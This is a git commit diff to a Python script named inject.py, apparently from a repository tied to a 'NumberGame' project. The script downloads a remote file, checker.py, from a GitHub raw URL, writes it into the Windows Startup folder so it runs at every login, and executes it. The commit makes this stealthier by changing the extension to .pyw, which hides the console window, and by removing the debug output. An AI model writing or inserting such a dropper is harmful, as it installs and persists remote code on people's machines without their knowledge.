a188dc58548a321cfe5ae601ceacb2fd1ad81bb7
xXEthyleneXx <xXEthyleneXx@protonmail.com>
2021-02-19 07:24:51 -0500

    `

--- inject.py
+++ inject.py
@@ -2,16 +2,10 @@
 def clone():
     import os, urllib.request, pathlib
     dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/checker.py'
-    home = os.path.expanduser("~") #pathlib.Path.cwd()
-    path = str(home) + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\checker.py'
+    home = os.path.expanduser("~")
+    path = str(home) + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\checker.pyw'
     urllib.request.urlretrieve(dlurl, '{}'.format(path))
     os.system('{}'.format(str(path)))
-    sleep(2)
-    print('worked')
     exit()
-def sleep(Time):
-    import time as t
-    t.sleep(Time)
-sleep(3)
 
 clone()
